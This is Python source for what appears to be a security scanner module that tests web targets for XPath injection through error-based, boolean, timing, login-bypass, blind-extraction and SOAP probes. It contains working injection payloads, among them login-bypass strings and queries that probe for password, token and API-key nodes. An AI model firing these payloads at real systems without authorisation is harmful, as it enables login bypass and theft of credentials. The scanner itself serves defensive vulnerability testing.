"""
XPath Injection Scanner — InsertionPoint per-parameter isolation (CWE-643).

Architecture:
  Phase 1: Error-based XPath injection (13 error patterns, 10+ payloads)
  Phase 2: Boolean-based blind XPath (response differential)
  Phase 3: Auth bypass via login forms
  Phase 4: Timing-based blind XPath (position()/last() heavy queries)
  Phase 5: XPath 2.0 function payloads + data extraction
"""

import re
import time
from urllib.parse import urlparse, parse_qs

from secprobe.config import Severity
from secprobe.core.insertion_points import (
    InsertionPointDiscovery, InsertionType, send_request,
)
from secprobe.scanners.smart_scanner import SmartScanner
from secprobe.utils import normalize_url, print_status, print_finding


XPATH_ERROR_PATTERNS = [
    re.compile(r"XPath(?:Exception|Error|Syntax)", re.IGNORECASE),
    re.compile(r"Invalid XPath expression", re.IGNORECASE),
    re.compile(r"XPATH syntax error", re.IGNORECASE),
    re.compile(r"javax\.xml\.xpath", re.IGNORECASE),
    re.compile(r"SimpleXMLElement::xpath", re.IGNORECASE),
    re.compile(r"DOMXPath::(?:query|evaluate)", re.IGNORECASE),
    re.compile(r"lxml\.etree\.XPath", re.IGNORECASE),
    re.compile(r"xmlXPathEval", re.IGNORECASE),
    re.compile(r"Unknown (?:axis|node test)", re.IGNORECASE),
    re.compile(r"Expression must evaluate to a node-set", re.IGNORECASE),
    re.compile(r"XPathEvalError", re.IGNORECASE),
    re.compile(r"XPathParserException", re.IGNORECASE),
    re.compile(r"XPathResultType", re.IGNORECASE),
]

XPATH_ERROR_PAYLOADS = [
    ("']", "Broken single-quote bracket"),
    ("\"]", "Broken double-quote bracket"),
    ("'or'1'='1", "OR injection"),
    ("' or '' ='", "Empty-string OR"),
    ("1' and '1'='1", "AND true"),
    ("' or 1=1 or '' ='", "Numeric OR"),
    ("') or ('1'='1", "Parenthetical OR"),
    ("' or count(//*)>0 or '' ='", "Count function"),
    ("' or string-length(name(/*))>0 or '' ='", "String-length"),
    ("' or name(//*)=' ", "Name function"),
]

XPATH_BOOLEAN_PAIRS = [
    ("' or '1'='1", "' or '1'='2", "String comparison"),
    ("' or 1=1 or '' ='", "' or 1=2 or '' ='", "Numeric comparison"),
    ("') or ('1'='1", "') or ('1'='2", "Parenthetical comparison"),
    ("' or count(//*)>0 or '' ='", "' or count(//*)>99999999 or '' ='", "Count function"),
]

XPATH_AUTH_BYPASS = [
    ("' or '1'='1", "' or '1'='1", "OR 1=1"),
    ("admin' or '1'='1' or 'a'='a", "anything", "Admin OR bypass"),
    ("' or 1=1]%00", "anything", "Null byte terminate"),
    ("admin']/parent::*/child::node()%00", "x", "Node traversal"),
    ("' or ''='", "' or ''='", "Empty string OR"),
]

# XPath 2.0 function payloads — more powerful than 1.0
XPATH2_PAYLOADS = [
    ("' or substring-after(name(/*), '')!='' or '' ='", "substring-after"),
    ("' or starts-with(name(/*), '') or '' ='", "starts-with"),
    ("' or contains(name(/*), '') or '' ='", "contains"),
    ("' or string-length(name(/*))>0 or '' ='", "string-length"),
    ("' or normalize-space(name(/*))!='' or '' ='", "normalize-space"),
    ("' or translate(name(/*), '', '')!='' or '' ='", "translate"),
    ("' or concat(name(/*), '')!='' or '' ='", "concat"),
]

# Timing payloads — XPath expressions that take significant computation
XPATH_TIMING_PAYLOADS = [
    ("' or count(//*//*//*//*//*)>0 or '' ='", "Deep recursive count"),
    ("' or string-length(concat(name(/*[1]),name(/*[1]),name(/*[1]),name(/*[1]),name(/*[1]),name(/*[1]),name(/*[1]),name(/*[1])))>0 or '' ='", "Heavy concat"),
    ("' or count(//*[contains(name(), 'a') or contains(name(), 'b') or contains(name(), 'c')])>0 or '' ='", "Multi-predicate scan"),
]

# Data extraction boolean pairs for blind enumeration
XPATH_EXTRACT_PAIRS = [
    ("' or substring(name(/*),1,1)='a' or '' ='", "' or substring(name(/*),1,1)='z' or '' ='",
     "Root element name extraction"),
    ("' or count(/*)=1 or '' ='", "' or count(/*)=999 or '' ='",
     "Child count check"),
    ("' or string-length(name(/*))>1 or '' ='", "' or string-length(name(/*))>100 or '' ='",
     "Name length extraction"),
]

# SOAP-specific payloads
SOAP_XPATH_PAYLOADS = [
    ("' or //password/text()!='' or '' ='", "SOAP password extraction"),
    ("' or //token/text()!='' or '' ='", "SOAP token extraction"),
    ("' or //*[local-name()='password']!='' or '' ='", "NS-agnostic password"),
    ("' or //*[local-name()='apiKey']!='' or '' ='", "NS-agnostic API key"),
]


class XPathScanner(SmartScanner):
    name = "XPath Scanner"
    description = "Test for XPath Injection vulnerabilities (CWE-643)"

    def scan(self):
        url = normalize_url(self.config.target)
        print_status(f"Testing XPath injection on {url}", "progress")

        try:
            baseline = self.http_client.get(url)
        except Exception as e:
            self.result.error = str(e)
            return

        baseline_text = baseline.text
        found_vulns = set()

        # ── Discover insertion points ────────────────────────────────
        discovery = InsertionPointDiscovery(
            include_headers=False,
            include_cookies=True,
            include_paths=False,
        )
        points = discovery.discover(url, response=baseline)
        query_points = [p for p in points if p.type == InsertionType.QUERY_PARAM]

        if not query_points:
            for p in ["user", "name", "id", "search", "query", "category", "node", "path", "item"]:
                test_url = f"{url}{'&' if '?' in url else '?'}{p}=test"
                pts = discovery.discover(test_url)
                query_points.extend(
                    pt for pt in pts
                    if pt.type == InsertionType.QUERY_PARAM and pt.name == p
                )

        # ── Phase 1: Error-based per-param ───────────────────────────
        self._test_error_based(query_points, baseline_text, found_vulns)

        # ── Phase 2: Boolean-based per-param ─────────────────────────
        self._test_boolean(query_points, baseline_text, found_vulns)

        # ── Phase 3: Auth bypass via forms ───────────────────────────
        forms = self.context.get_injectable_forms() if self.context else []
        self._test_auth_bypass(url, forms, found_vulns)

        # ── Phase 4: Timing-based blind XPath ────────────────────────
        self._test_timing_based(query_points, found_vulns)

        # ── Phase 5: XPath 2.0 + data extraction + SOAP ─────────────
        self._test_xpath2_functions(query_points, baseline_text, found_vulns)
        self._test_data_extraction(query_points, baseline_text, found_vulns)
        self._test_soap_xpath(query_points, baseline_text, found_vulns)

        if not found_vulns:
            self.add_finding(
                title="No XPath injection detected",
                severity=Severity.INFO,
                description="Automated tests did not detect XPath injection.",
                category="XPath Injection",
            )

    def _test_error_based(self, query_points, baseline_text, found_vulns):
        """Phase 1: Error-based XPath injection — one param at a time."""
        print_status("Phase 1: Error-based XPath injection", "progress")

        for point in query_points:
            for payload, desc in XPATH_ERROR_PAYLOADS:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                spec = point.inject(payload, mode="append")
                try:
                    resp = send_request(self.http_client, spec, allow_redirects=False)
                except Exception:
                    continue

                for pattern in XPATH_ERROR_PATTERNS:
                    if pattern.search(resp.text) and not pattern.search(baseline_text):
                        found_vulns.add((spec.url, point.name))
                        self.add_finding(
                            title=f"XPath Injection (error-based) - {desc}",
                            severity=Severity.HIGH,
                            description=f"XPath error via {point.display_name}: {pattern.pattern}",
                            recommendation="Use parameterised XPath queries. Escape XML metacharacters.",
                            evidence=f"Point: {point.display_name}\nPayload: {payload}",
                            category="XPath Injection", url=spec.url, cwe="CWE-643",
                        )
                        print_finding(Severity.HIGH, f"XPath: {desc} on {point.name}")
                        break
                else:
                    continue
                break

    def _test_boolean(self, query_points, baseline_text, found_vulns):
        """Phase 2: Boolean-based XPath injection — one param at a time."""
        print_status("Phase 2: Boolean-based XPath injection", "progress")

        for point in query_points:
            if point.name in {v[1] for v in found_vulns}:
                continue

            for true_p, false_p, desc in XPATH_BOOLEAN_PAIRS:
                true_spec = point.inject(true_p, mode="append")
                false_spec = point.inject(false_p, mode="append")
                try:
                    true_resp = send_request(self.http_client, true_spec, allow_redirects=False)
                    false_resp = send_request(self.http_client, false_spec, allow_redirects=False)
                except Exception:
                    continue

                size_diff = abs(len(true_resp.text) - len(false_resp.text))
                status_diff = true_resp.status_code != false_resp.status_code
                if size_diff > 100 or (size_diff > 50 and status_diff):
                    found_vulns.add((true_spec.url, point.name))
                    self.add_finding(
                        title=f"XPath Injection (boolean) via '{point.name}' - {desc}",
                        severity=Severity.HIGH,
                        description=f"Boolean XPath changes response via {point.display_name}.",
                        recommendation="Use parameterised XPath queries.",
                        evidence=(
                            f"True: {len(true_resp.text)}B ({true_resp.status_code}), "
                            f"False: {len(false_resp.text)}B ({false_resp.status_code})"
                        ),
                        category="XPath Injection", url=true_spec.url, cwe="CWE-643",
                    )
                    break

    def _test_auth_bypass(self, url, forms, found_vulns):
        """Phase 3: XPath auth bypass via forms."""
        print_status("Phase 3: XPath auth bypass", "progress")

        for form in forms:
            action = form.get("action", url)
            fields = form.get("fields", {})
            user_field = next(
                (f for f in fields if any(k in f.lower() for k in ["user", "login", "name"])),
                None,
            )
            pass_field = next(
                (f for f in fields if any(k in f.lower() for k in ["pass", "pwd"])),
                None,
            )
            if not user_field:
                continue

            for user_val, pass_val, desc in XPATH_AUTH_BYPASS:
                post_data = dict(fields)
                post_data[user_field] = user_val
                if pass_field:
                    post_data[pass_field] = pass_val
                try:
                    resp = self.http_client.post(action, data=post_data, allow_redirects=False)
                    if resp.status_code in (200, 301, 302):
                        if any(kw in resp.text.lower() for kw in ["welcome", "dashboard"]) or resp.status_code in (301, 302):
                            found_vulns.add((action, user_field))
                            self.add_finding(
                                title=f"XPath Auth Bypass - {desc}",
                                severity=Severity.CRITICAL,
                                description=f"XPath auth bypass on '{user_field}'.",
                                recommendation="Use parameterised XPath queries.",
                                evidence=f"URL: {action}\nUser: {user_val}",
                                category="XPath Injection", url=action, cwe="CWE-643",
                            )
                            break
                except Exception:
                    continue

    def _test_timing_based(self, query_points, found_vulns):
        """Phase 4: Timing-based blind XPath — expensive expression evaluation."""
        print_status("Phase 4: Timing-based blind XPath injection", "progress")

        for point in query_points:
            if point.name in {v[1] for v in found_vulns}:
                continue

            # Establish baseline timing (3 measurements)
            base_times = []
            for _ in range(3):
                spec = point.inject("test", mode="replace")
                try:
                    t0 = time.time()
                    send_request(self.http_client, spec, allow_redirects=False)
                    base_times.append(time.time() - t0)
                except Exception:
                    base_times.append(0)
            avg_base = sum(base_times) / len(base_times) if base_times else 0

            for payload, desc in XPATH_TIMING_PAYLOADS:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                spec = point.inject(payload, mode="append")
                try:
                    t0 = time.time()
                    resp = send_request(self.http_client, spec, allow_redirects=False)
                    elapsed = time.time() - t0
                except Exception:
                    continue

                if elapsed > avg_base * 3 and elapsed - avg_base > 2.0:
                    # Verify with second measurement
                    try:
                        t0 = time.time()
                        send_request(self.http_client, spec, allow_redirects=False)
                        elapsed2 = time.time() - t0
                    except Exception:
                        continue

                    if elapsed2 > avg_base * 2.5 and elapsed2 - avg_base > 1.5:
                        found_vulns.add((spec.url, point.name))
                        self.add_finding(
                            title=f"XPath Injection (timing) via '{point.name}' - {desc}",
                            severity=Severity.HIGH,
                            description=(
                                f"Timing-based blind XPath injection on {point.display_name}.\n"
                                f"Heavy XPath expression causes measurable delay."
                            ),
                            recommendation="Use parameterised XPath queries. Limit expression complexity.",
                            evidence=(
                                f"Baseline: {avg_base:.2f}s, "
                                f"Injected: {elapsed:.2f}s / {elapsed2:.2f}s"
                            ),
                            category="XPath Injection", url=spec.url, cwe="CWE-643",
                        )
                        print_finding(Severity.HIGH, f"XPath timing: {desc} on {point.name}")
                        break

    def _test_xpath2_functions(self, query_points, baseline_text, found_vulns):
        """Phase 5a: XPath 2.0 function payloads."""
        print_status("Phase 5: XPath 2.0 function payloads", "progress")

        for point in query_points:
            if point.name in {v[1] for v in found_vulns}:
                continue

            for payload, desc in XPATH2_PAYLOADS:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                spec = point.inject(payload, mode="append")
                try:
                    resp = send_request(self.http_client, spec, allow_redirects=False)
                except Exception:
                    continue

                # XPath 2.0 OR condition returns more data
                if len(resp.text) > len(baseline_text) + 100 and resp.status_code == 200:
                    found_vulns.add((spec.url, point.name))
                    self.add_finding(
                        title=f"XPath 2.0 Injection ({desc}) — '{point.name}'",
                        severity=Severity.HIGH,
                        description=(
                            f"XPath 2.0 function {desc} injected via {point.display_name}.\n"
                            f"Response size increased by {len(resp.text) - len(baseline_text)}B."
                        ),
                        recommendation="Use parameterised XPath queries. Disable XPath 2.0 if not needed.",
                        evidence=f"Point: {point.display_name}\nFunction: {desc}",
                        category="XPath Injection", url=spec.url, cwe="CWE-643",
                    )
                    break

                # Also check for errors (may reveal XPath 2.0 support)
                for pattern in XPATH_ERROR_PATTERNS:
                    if pattern.search(resp.text) and not pattern.search(baseline_text):
                        found_vulns.add((spec.url, point.name))
                        self.add_finding(
                            title=f"XPath 2.0 Error ({desc}) — '{point.name}'",
                            severity=Severity.HIGH,
                            description=f"XPath 2.0 function {desc} triggers error on {point.display_name}.",
                            recommendation="Use parameterised XPath queries.",
                            evidence=f"Point: {point.display_name}\nPayload: {payload}",
                            category="XPath Injection", url=spec.url, cwe="CWE-643",
                        )
                        break
                else:
                    continue
                break

    def _test_data_extraction(self, query_points, baseline_text, found_vulns):
        """Phase 5b: Blind data extraction via boolean differential."""
        print_status("Phase 5b: XPath data extraction", "progress")

        for point in query_points:
            if point.name in {v[1] for v in found_vulns}:
                continue

            for true_p, false_p, desc in XPATH_EXTRACT_PAIRS:
                true_spec = point.inject(true_p, mode="append")
                false_spec = point.inject(false_p, mode="append")
                try:
                    true_resp = send_request(self.http_client, true_spec, allow_redirects=False)
                    false_resp = send_request(self.http_client, false_spec, allow_redirects=False)
                except Exception:
                    continue

                size_diff = abs(len(true_resp.text) - len(false_resp.text))
                if size_diff > 50:
                    found_vulns.add((true_spec.url, point.name))
                    self.add_finding(
                        title=f"XPath Data Extraction ({desc}) — '{point.name}'",
                        severity=Severity.HIGH,
                        description=(
                            f"Blind XPath data extraction possible via {point.display_name}.\n"
                            f"Boolean differential reveals XML structure.\n"
                            f"Technique: {desc}"
                        ),
                        recommendation="Use parameterised XPath queries.",
                        evidence=(
                            f"True: {len(true_resp.text)}B, False: {len(false_resp.text)}B\n"
                            f"Diff: {size_diff}B"
                        ),
                        category="XPath Injection", url=true_spec.url, cwe="CWE-643",
                    )
                    break

    def _test_soap_xpath(self, query_points, baseline_text, found_vulns):
        """Phase 5c: SOAP-specific XPath injection."""
        print_status("Phase 5c: SOAP XPath injection", "progress")

        for point in query_points:
            if point.name in {v[1] for v in found_vulns}:
                continue

            for payload, desc in SOAP_XPATH_PAYLOADS:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                spec = point.inject(payload, mode="append")
                try:
                    resp = send_request(self.http_client, spec, allow_redirects=False)
                except Exception:
                    continue

                # Check for data leakage or error disclosure
                if len(resp.text) > len(baseline_text) + 100 and resp.status_code == 200:
                    found_vulns.add((spec.url, point.name))
                    self.add_finding(
                        title=f"SOAP XPath Injection ({desc}) — '{point.name}'",
                        severity=Severity.CRITICAL,
                        description=(
                            f"SOAP XPath injection leaks data via {point.display_name}.\n"
                            f"Attack: {desc}"
                        ),
                        recommendation="Use parameterised XPath queries in SOAP handlers.",
                        evidence=f"Point: {point.display_name}\nPayload: {payload}",
                        category="XPath Injection", url=spec.url, cwe="CWE-643",
                    )
                    break

                for pattern in XPATH_ERROR_PATTERNS:
                    if pattern.search(resp.text) and not pattern.search(baseline_text):
                        found_vulns.add((spec.url, point.name))
                        self.add_finding(
                            title=f"SOAP XPath Error ({desc}) — '{point.name}'",
                            severity=Severity.HIGH,
                            description=f"SOAP XPath: {desc} triggers error on {point.display_name}.",
                            recommendation="Use parameterised XPath queries.",
                            evidence=f"Point: {point.display_name}\nPayload: {payload}",
                            category="XPath Injection", url=spec.url, cwe="CWE-643",
                        )
                        break
                else:
                    continue
                break
